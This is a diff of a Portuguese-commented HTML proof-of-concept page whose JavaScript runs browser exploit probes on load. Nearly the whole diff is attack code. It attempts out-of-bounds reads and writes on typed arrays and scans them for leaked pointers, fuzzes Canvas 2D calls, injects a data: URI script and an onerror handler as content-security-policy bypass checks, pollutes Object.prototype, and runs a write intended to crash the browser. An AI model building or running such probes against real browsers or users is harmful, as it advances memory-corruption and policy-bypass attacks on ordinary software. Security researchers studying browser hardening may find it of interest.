@@ -28,7 +28,7 @@
     <canvas id="exploit-canvas" width="10" height="10" style="border:1px solid #555; display: none;"></canvas> <script>
         let outputDiv = document.getElementById('poc-output');
         const log = (message, type = 'info') => { /* Função log igual anterior */
-             if (!outputDiv) return; try { const t=`[${new Date().toLocaleTimeString()}]`; const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000); outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;} outputDiv.innerHTML+=`<span class="log-<span class="math-inline">\{type\}"\></span>{t} ${s}\n</span>`; outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}
+             if (!outputDiv) return; try { const t=`[${new Date().toLocaleTimeString()}]`; const s=String(message).replace(/</g,"&lt;").replace(/>/g,"&gt;"); if(outputDiv.innerHTML.length>500000){outputDiv.innerHTML=outputDiv.innerHTML.substring(outputDiv.innerHTML.length-250000); outputDiv.innerHTML=`<span>[Log Truncado...]</span>\n`+outputDiv.innerHTML;} outputDiv.innerHTML+=`<span class="log-${type}">${t} ${s}\n</span>`; outputDiv.scrollTop=outputDiv.scrollHeight;}catch(e){console.error("Erro log:",e);outputDiv=null;}
         };
         const PAUSE_DURATION = 300;
 
@@ -37,84 +37,92 @@
              if(high===null||low===null||typeof high!=='number'||typeof low!=='number')return false;
              if(high===0&&low===0)return false; // Ignora nulo
              if(high===0xFFFFFFFF&&low===0xFFFFFFFF)return false; // Ignora -1
-             if(high===0xAAAAAAAA&&low===0xAAAAAAAA)return false; // Ignora padrão AAAA (vamos tratá-lo separadamente)
-             // Heurística muito simples: High não zero ou Low muito grande sugere ponteiro/dado
-             return high > 0 || low > 0xFFFF;
+             // Ignorar o padrão AAAA específico que vimos
+             if(high===0xAAAAAAAA&&low===0xAAAAAAAA)return false;
+             // Heurística: High diferente de 0 ou Low grande/ímpar (menos comum para dados alinhados)
+             return high > 0 || (low > 0xFFFF && low !== 0xAAAAAAAA); // Ajustado
          };
         const toHex = (val, bits = 32) => { if(typeof val!=='number'||!isFinite(val))return'NaN/Invalid';let n=Number(val);if(bits<=32){n=n>>>0;}const p=Math.ceil(bits/4);return'0x'+n.toString(16).toUpperCase().padStart(p,'0');};
 
 
         // --- Funções de Teste ---
 
-        // Teste 1: Investigação dos Leaks OOB @ Offsets 32, 52
+        // Teste 1: Investigação dos Leaks OOB @ Offsets Específicos (32, 52) + Leitura Ampla
         const runOOBInvestigateLeakOffsets = async () => {
             log("--- Iniciando Teste 1: Investigação Leak OOB @ Offsets 32, 52 ---", 'test');
             try {
-                const bufferSize = 128; // Buffer maior para mais espaço OOB
+                const bufferSize = 128; // Manter buffer maior
                 const buffer = new ArrayBuffer(bufferSize);
                 const u8view = new Uint8Array(buffer);
                 const dataView = new DataView(buffer);
-                const testOffsetsBytes = [32, 52]; // Offsets em bytes *relativos ao fim do buffer* onde 0xAAAA... foi visto
-                const writePattern = 0xBEEFCAFE; // Padrão de escrita 32-bit
-                const writePatternBytes = [(writeValue >> 0) & 0xFF, (writeValue >> 8) & 0xFF, (writeValue >> 16) & 0xFF, (writeValue >> 24) & 0xFF];
+                // Offsets em bytes *relativos ao FIM do buffer* onde 0xAAAA... foi visto
+                // Convertendo para offsets absolutos a partir do INÍCIO do buffer para DataView
+                const leakCheckOffsets = [bufferSize + 32, bufferSize + 52];
+                const writePattern = 0xCAFEBABE; // Padrão diferente para escrita/verificação
 
                 // Confirmar OOB Write básico primeiro
                 log("Confirmando OOB Write básico @ -1...", 'subtest');
                 try { u8view[-1] = 0xDD; log("OOB Write @ -1 OK.", 'good'); }
-                catch (e) { log("FALHA OOB Write @ -1. Abortando Teste 1.", 'error'); return; }
+                catch (e) { log("FALHA OOB Write @ -1. Continuando com cuidado...", 'warn'); /* Não abortar */ }
 
-                for (const leakOffset of testOffsetsBytes) {
-                    const absoluteWriteReadOffset = bufferSize + leakOffset; // Onde vamos escrever/ler OOB
-                    log(`Investigando offset OOB de ${leakOffset} bytes (Absoluto: ${absoluteWriteReadOffset})...`, 'subtest');
+                // A. Tentar Escrever e Verificar nos Offsets do Leak
+                for (const targetOffset of leakCheckOffsets) {
+                    log(`Verificando controle de escrita/leitura no offset absoluto ${targetOffset}...`, 'subtest');
+                    let initialValueLow = null, initialValueHigh = null;
+                    try { // Ler valor inicial (pode ser AAAA...)
+                         initialValueLow = dataView.getUint32(targetOffset, true);
+                         initialValueHigh = dataView.getUint32(targetOffset + 4, true);
+                         log(` -> Valor inicial @${targetOffset}: H=${toHex(initialValueHigh)} L=${toHex(initialValueLow)}`, 'info');
+                    } catch(e) { log(` -> Erro ao ler valor inicial @${targetOffset}: ${e.message}`, 'warn');}
 
-                    // A. Tentar Escrever e Verificar
-                    log(` -> Testando ESCRITA OOB U32 no offset ${absoluteWriteReadOffset}...`, 'info');
-                    let writeConfirmed = false;
-                    try {
-                        dataView.setUint32(absoluteWriteReadOffset, writePattern, true); // Escreve padrão
-                        log("    Escrita OOB (setUint32) realizada sem erro.", 'warn');
+                    try { // Tentar escrever
+                        dataView.setUint32(targetOffset, writePattern, true); // Escreve padrão (parte baixa)
+                        dataView.setUint32(targetOffset + 4, 0, true);      // Zera parte alta
+                        log(` -> Escrita OOB (setUint32 ${toHex(writePattern)}) realizada em ${targetOffset} (sem erro).`, 'warn');
+
                         // Ler de volta imediatamente
-                        const readBack = dataView.getUint32(absoluteWriteReadOffset, true);
-                        if (readBack === writePattern) {
-                            log(`    VULN: Leitura pós-escrita confirmou o valor ${toHex(readBack)}! Controle de escrita OOB OK.`, 'vuln');
-                            writeConfirmed = true;
+                        const readBackLow = dataView.getUint32(targetOffset, true);
+                        const readBackHigh = dataView.getUint32(targetOffset + 4, true);
+                        if (readBackLow === writePattern && readBackHigh === 0) {
+                            log(`    VULN: Leitura pós-escrita confirmou ${toHex(readBackLow)}! Controle de escrita OOB OK.`, 'vuln');
                         } else {
-                            log(`    AVISO: Leitura pós-escrita retornou ${toHex(readBack)}, diferente do esperado ${toHex(writePattern)}.`, 'warn');
+                            log(`    AVISO: Leitura pós-escrita: H=${toHex(readBackHigh)} L=${toHex(readBackLow)} (Esperado H=0 L=${toHex(writePattern)})`, 'warn');
                         }
                     } catch (e) {
-                        log(`    ERRO/BLOQUEIO na escrita/leitura OOB U32 no offset ${absoluteWriteReadOffset}: ${e.message}`, 'good');
+                        log(` -> ERRO/BLOQUEIO na escrita/leitura OOB U32 no offset ${targetOffset}: ${e.message}`, 'good');
                     }
+                     await new Promise(resolve => setTimeout(resolve, 50)); // Pausa
+                } // Fim loop offsets de escrita/verificação
 
-                    // B. Leitura Ampla ao Redor (se escrita funcionou ou queremos tentar mesmo assim)
-                    log(` -> Testando LEITURA OOB ampla ao redor de ${absoluteWriteReadOffset}...`, 'info');
-                    const readWindowBytes = 256; // Ler 128 bytes antes, 128 depois
-                    const startReadOffset = absoluteWriteReadOffset - (readWindowBytes / 2);
-                    let foundPotentialLeak = false;
-                    for(let i = 0; i < readWindowBytes / 8; i++) { // Ler em blocos de 8 bytes
-                        const currentByteOffset = startReadOffset + (i * 8);
-                         try {
-                             // Ler como U64 (simulado)
-                             const low = dataView.getUint32(currentByteOffset, true);
-                             const high = dataView.getUint32(currentByteOffset + 4, true);
-                             const u64Str = `H=<span class="math-inline">\{toHex\(high\)\} L\=</span>{toHex(low)}`;
+                // B. Leitura Ampla ao Redor
+                log(`Testando LEITURA OOB ampla ao redor da área dos leaks...`, 'subtest');
+                const readWindowCenter = bufferSize + 42; // Ponto central entre 32 e 52
+                const readWindowBytes = 256;
+                const startReadOffset = readWindowCenter - (readWindowBytes / 2);
+                let foundPotentialLeak = false;
+                log(`Lendo ${readWindowBytes} bytes (offset ${startReadOffset} a ${startReadOffset + readWindowBytes})...`, 'info');
 
-                             // Reportar qualquer coisa diferente de 0 ou AAAA... (se for o padrão esperado)
-                             if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) {
-                                 // Logar talvez o primeiro AAAA encontrado
-                                 // log(`  Leak Padrão AAAA @Byte ${currentByteOffset}`, 'info');
-                             } else if (high !== 0 || low !== 0) {
-                                 log(`  Leak U64? @Byte ${currentByteOffset}: ${u64Str}`, 'leak');
-                                 if (isPotentialPointer64(high, low)) {
-                                     log(`    >> POTENCIAL PONTEIRO!`, 'ptr');
-                                     foundPotentialLeak = true;
-                                 }
+                for(let i = 0; i < readWindowBytes / 8; i++) { // Ler em blocos de 8 bytes
+                    const currentByteOffset = startReadOffset + (i * 8);
+                     try {
+                         // Ler como U64 (simulado)
+                         const low = dataView.getUint32(currentByteOffset, true);
+                         const high = dataView.getUint32(currentByteOffset + 4, true);
+                         const u64Str = `H=${toHex(high)} L=${toHex(low)}`;
+
+                         if (high === 0xAAAAAAAA && low === 0xAAAAAAAA) { /* Ignorar AAAA */ }
+                         else if (high !== 0 || low !== 0) {
+                             log(`  Leak U64? @Byte ${currentByteOffset}: ${u64Str}`, 'leak');
+                             if (isPotentialPointer64(high, low)) {
+                                 log(`    >> POTENCIAL PONTEIRO!`, 'ptr'); // Usar classe 'ptr' para magenta
+                                 foundPotentialLeak = true;
                              }
-                         } catch(e) {} // Ignorar erros de leitura fora dos limites "reais"
-                    }
-                     if (!foundPotentialLeak) { log("    Nenhum ponteiro/dado OOB suspeito encontrado na leitura ampla.", 'info'); }
-
-                    await new Promise(resolve => setTimeout(resolve, 50));
-                } // fim loop offsets
+                         }
+                     } catch(e) {} // Ignorar erros de leitura fora dos limites "reais"
+                     // Adicionar pausa mínima para não travar em loop longo
+                      if (i % 8 === 0) await new Promise(resolve => setTimeout(resolve, 5));
+                }
+                 if (!foundPotentialLeak) { log("    Nenhum ponteiro/dado OOB suspeito encontrado na leitura ampla.", 'info'); }
 
             } catch (e) { log(`Erro GERAL no teste OOB Investigate Leak: ${e.message}`, 'warn'); }
             log("--- Teste 1 Concluído ---", 'test');
@@ -130,10 +138,105 @@
                  if (!ctx) { log("Contexto 2D não obtido.", 'error'); return; }
                  log("Contexto Canvas 2D obtido.", 'info');
 
-                 // Tentativa 1: Dimensões/Coordenadas Inválidas/Grandes
                  log("Tentando drawImage com valores extremos...", 'subtest');
+                 try { ctx.drawImage(canvas, -10000, -10000, 0xFFFFFFFF, 0xFFFFFFFF); log("drawImage extremo OK (?).", 'warn'); } catch (e) { log(`Erro drawImage: ${e.message}`, 'good'); }
+                  await new Promise(resolve => setTimeout(resolve, 50));
+
+                 log("Tentando putImageData inconsistente...", 'subtest');
+                  try { const smallBuffer=new Uint8ClampedArray(10*10*4/2); const badImageData=new ImageData(smallBuffer, 10, 10); ctx.putImageData(badImageData, 0, 0); log("putImageData inconsistente OK (?).", 'warn'); } catch (e) { log(`Erro putImageData: ${e.message}`, 'good'); }
+                   await new Promise(resolve => setTimeout(resolve, 50));
+
+                  log("Tentando createPattern inválido...", 'subtest');
+                  try { const invalidSource = document.createElement('div'); ctx.createPattern(invalidSource, 'repeat'); log("createPattern inválido OK (?).", 'warn'); } catch (e) { log(`Erro createPattern: ${e.message}`, 'good'); }
+                   await new Promise(resolve => setTimeout(resolve, 50));
+
+                  log("Tentando obter contexto 2D muitas vezes...", 'subtest');
+                  try { for (let i=0; i<50; i++){ canvas.getContext('2d'); } log("getContext repetido OK.", 'info'); } catch(e) { log(`Erro getContext repetido: ${e.message}`, 'error'); }
+
+             } catch (e) { log(`Erro GERAL no teste Canvas Exploit: ${e.message}`, 'warn'); }
+             log("--- Teste 2 Concluído ---", 'test');
+        };
+
+        // Função para adicionar o link que chama o teste do Canvas
+        const addCanvasLinkTest = () => {
+             log("Adicionando link para teste manual do Canvas 2D...", 'info');
+             try {
+                const canvasLink = document.createElement('a');
+                canvasLink.href = "javascript:attemptCanvasExploit();"; // Chama a função de teste
+                canvasLink.textContent = "[Clique AQUI para Testar Canvas 2D Exploit (Especulativo)]";
+                canvasLink.style.cssText='display:block;margin:10px;padding:5px;border:1px solid cyan;color:cyan;';
+                const placeholder = document.getElementById('js-link-placeholder');
+                if(placeholder) placeholder.replaceWith(canvasLink); else document.getElementById('controls').appendChild(canvasLink);
+                log("Link para teste Canvas adicionado.", 'warn');
+            } catch (e) { log(`Erro ao criar link Canvas:: ${e.message}`, 'warn'); }
+        };
+
+
+        // Teste 3: CSP Bypass (Confirmação e Setup do Link Canvas)
+        const runCSPConfirmation = () => {
+             log("--- Iniciando Teste 3: CSP Bypass (Confirmação e Setup Link Canvas) ---", 'test');
+             log("Injetando script data: URI (simples log)...", 'info');
+             try{const s=document.createElement('script'); s.src='data:text/javascript;base64,bG9nKCJDU1AgQnlwYXNzIGRhdGE6IFVSaSBCw6FzaWNvIE9LIiwgImdvb2QiKTs='; /* log('CSP Bypass data: URI Básico OK', 'good'); */ document.body.appendChild(s);}catch(e){}
+             log("Injetando img onerror (simples log)...", 'info');
+             try{const i=document.createElement('img');i.src='x';i.onerror=()=>{log("CSP Bypass onerror Básico OK!",'good');};document.body.appendChild(i);}catch(e){}
+
+             addCanvasLinkTest(); // Adiciona o link para o teste manual do Canvas
+
+             log("--- Teste 3 Concluído ---", 'test');
+        };
+
+        // Teste 4: Prototype Pollution (Confirmação)
+        const runPPBasic = () => { /* Mantido igual */
+             log("--- Iniciando Teste 4: PP Básico (Confirmação) ---", 'test'); const k='__pp_test_confirm__',v='PPOK';try{log(`Poluindo['${k}']...`,'info');Object.prototype[k]=v;const t={'w':window,'n':{}};let c=0;for(const n in t){try{if(t[n]&&t[n][k]===v){log(`VULN: PP básica OK! ${n}.${k}=${t[n][k]}`,'vuln');c++;}}catch(e){}} if(c>0)log(`Confirmado:${c} obj(s).`,'vuln');else log(`Aviso:Ñ confirmou PP.`,'warn'); try{delete Object.prototype[k];log("Limpou PP.",'info');}catch(e){}}catch(e){} log("--- Teste 4 Concluído ---",'test');
+        };
+
+        // Teste 5: OOB Write Básico (Confirmação)
+        const runOOBTestU8_Confirm = async () => { /* Mantido igual */
+            log("--- Iniciando Teste 5: OOB Write (Uint8 Confirmação) ---", 'test'); try {const bS=32; const b=new ArrayBuffer(bS); const v=new Uint8Array(b); const wV=0xEE; const wO=[-1,bS,bS+10]; for(const o of wO){ log(`Tentar OOB U8 @${o}...`,'subtest'); try{v[o]=wV;log(`VULN: OOB U8 @${o} OK!`,'vuln');}catch(e){log(`✅ OOB U8 @${o} Bloq: ${e.message}`,'good');} await new Promise(r=>setTimeout(r,20));}}catch(e){} log("--- Teste 5 Concluído ---", 'test');
+        };
+
+        // Teste 6: OOB Crash Probe (Opcional)
+        const runOOBCrashProbe = async () => {
+            log("--- Iniciando Teste 6: OOB Crash Probe ---", 'test');
+            log("AVISO: PODE TRAVAR!", 'warn'); await new Promise(resolve => setTimeout(resolve, 2000));
+            try { const b=new ArrayBuffer(32),v=new Uint8Array(b); const o=-30000; log(`Tentando escrita OOB AGRESSIVA offset ${o}...`, 'info'); v[o]=0xFE; log(`AVISO: Escrita OOB agressiva NÃO travou.`, 'warn'); }
+            catch (e) { log(`Erro crash probe (NÃO travou): ${e.message}`, 'warn'); } log("--- Teste 6 Concluído (se não travou) ---", 'test');
+        };
+
+
+        // --- Função Principal de Execução ---
+        const runAllTests = async () => {
+            log("Iniciando testes de PoC (Leak Invest + Canvas Link v4)...");
+            // Testes removidos: Corrupt Adjacent, PP Function Impact, UAF, TC, Env Probe
+            const tests = [
+                runOOBInvestigateLeakOffsets, // Teste 1 - Investigar Leak 0xAAAA...
+                runCSPConfirmation,           // Teste 2 - Confirmar CSP + Adicionar Link Canvas
+                runPPBasic,                   // Teste 3 - Confirmar PP
+                runOOBTestU8_Confirm,       // Teste 4 - Confirmar OOB Básico
+                runOOBCrashProbe              // Teste 5 - Crash Probe (Opcional)
+            ];
+             const totalTests = tests.length;
+             log(`Total de ${totalTests} testes automáticos na sequência.`);
+
+            for(let i=0; i < tests.length; i++){
+                 if (!outputDiv) { console.error("Output div NULO, parando testes."); break; }
                  try {
-                     // Usar o próprio canvas como imagem fonte pode ser problemático
-                     ctx.drawImage(canvas, -10000, -10000, 0xFFFFFFFF, 0xFFFFFFFF);
-                     log("drawImage com valores extremos executado sem erro (?).", 'warn');
-                 } catch (e) { log(`Erro
+                     log(`--- EXECUTANDO TESTE ${i+1}/${totalTests} ---`, 'test');
+                     const testFn = tests[i]; const result = testFn();
+                     if (result instanceof Promise) { await result; }
+                 } catch(testError) { log(`ERRO INESPERADO TESTE ${i+1}: ${testError.message} ${testError.stack}`, 'error'); }
+                 if (i < tests.length - 1 && outputDiv) {
+                    log(`Pausa ${PAUSE_DURATION}ms...`, 'info'); await new Promise(resolve => setTimeout(resolve, PAUSE_DURATION));
+                 }
+            }
+            if(outputDiv) log("\n\nTodos os testes automáticos concluídos. Verifique o link do Canvas.", 'test');
+            else console.error("Script concluído, mas div log não disponível.");
+        };
+
+        // Executar ao carregar a página
+        document.addEventListener('DOMContentLoaded', runAllTests);
+
+    </script>
+
+</body>
+</html>
